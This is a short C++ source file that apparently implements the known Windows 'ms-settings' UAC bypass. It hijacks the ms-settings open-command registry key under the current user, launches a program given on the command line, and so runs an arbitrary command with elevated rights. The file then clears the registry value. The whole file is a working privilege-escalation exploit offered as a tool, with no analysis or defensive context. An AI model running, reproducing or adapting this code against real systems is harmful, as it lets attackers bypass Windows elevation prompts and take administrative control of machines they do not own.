#include <windows.h>
#include <string>
using namespace std;
// Author:Vahab Programmer https://github.com\Vahab-Programmer
// Version: 0.0.1
void setreg(const char addr[],const char value[],const char name[]){
    HKEY key;
    RegCreateKey(HKEY_CURRENT_USER,addr,NULL);
    RegOpenKey(HKEY_CURRENT_USER,addr,&key);
    RegSetValueEx(key,(LPCSTR)name,0,REG_SZ,(const ::byte*)value,strlen(value)+1);
    RegCloseKey(key);
};
int main(int argc,char **argv){
    if (1==argc) return 1;
    const char ra[48]="Software\\Classes\\ms-settings\\shell\\open\\command";
    string base="cmd /C start ";
    string exec;
    for (int i=2;i < argc;i++){
        exec =exec + argv[i];
        exec =exec + " ";
    };
    string command=base+exec;
    setreg(ra,"","DelegateExecute");
    setreg(ra,command.c_str(),"");
    system(argv[1]);
    setreg(ra,"","");
}